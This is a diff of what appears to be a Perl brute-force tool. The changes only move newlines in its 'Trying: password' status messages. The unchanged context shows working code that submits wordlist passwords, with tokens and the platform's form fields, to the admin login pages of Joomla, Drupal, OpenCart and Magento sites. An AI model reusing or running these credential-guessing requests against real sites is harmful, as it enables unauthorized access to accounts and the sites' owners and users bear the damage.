@@ -333,7 +333,7 @@ $joompass = $_;
 print color('bold red')," [";
 print color('bold green'),"+";
 print color('bold red'),"] ";
-print color('bold white'),"Trying: $joompass \n";
+print color('bold white')," \nTrying: $joompass ";
 $joomlabrute = POST $joomsite, [username => $joomuser, passwd => $joompass, lang =>en-GB, option => user_login, task => login, $token => 1];
 $response = $ua->request($joomlabrute);
 
@@ -365,7 +365,7 @@ $drupass = $_;
 print color('bold red')," [";
 print color('bold green'),"+";
 print color('bold red'),"] ";
-print color('bold white'),"Trying: $drupass \n";
+print color('bold white'),"\nTrying: $drupass ";
 
 $drupal = $site . '/user/login';
 $redirect = $site . '/user/1';
@@ -400,7 +400,7 @@ $ocpass = $_;
 print color('bold red')," [";
 print color('bold green'),"+";
 print color('bold red'),"] ";
-print color('bold white'),"Trying: $ocpass \n";
+print color('bold white'),"\nTrying: $ocpass ";
 $OpenCart= $site . '/admin/index.php';
 
 $ocbrute = POST $OpenCart, [username => $ocuser, password => $ocpass,];
@@ -455,7 +455,7 @@ $magpass = $_;
 print color('bold red')," [";
 print color('bold green'),"+";
 print color('bold red'),"] ";
-print color('bold white'),"Trying: $magpass \n";
+print color('bold white'),"\nTrying: $magpass ";
 
 $magbrute = POST $magsite, ["form_key" => "$token", "login[username]" => "$maguser", "dummy" => "", "login[password]" => "$magpass"];
 $response = $ua->request($magbrute);
